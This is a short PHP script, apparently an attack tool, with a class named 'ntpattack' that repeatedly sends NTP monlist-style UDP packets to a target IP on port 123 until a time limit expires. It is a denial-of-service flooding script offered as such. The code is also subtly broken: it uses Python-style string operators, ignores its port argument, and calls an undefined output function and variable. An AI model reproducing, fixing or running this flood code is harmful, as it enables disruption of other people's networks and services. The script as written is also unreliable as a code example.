<?php
class ntpattack{
	function ntpattack($ip, $port, $starttime, $max_time, $exec_time){
		while(1){ 
			try{
				$packets++;
					if(time() > $max_time){
						output($packets, $starttime, $exec_time, $lenght);
						break; 
					}
				$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
				socket_connect($sock, $ip, 123);
				$data = "\x17\x00\x03\x2a" + "\x00" * 4;
				socket_send($sock, $data, strlen($data), 0);
			}catch (Exception $e){
				echo $e;
			}
		}
	}
}

?>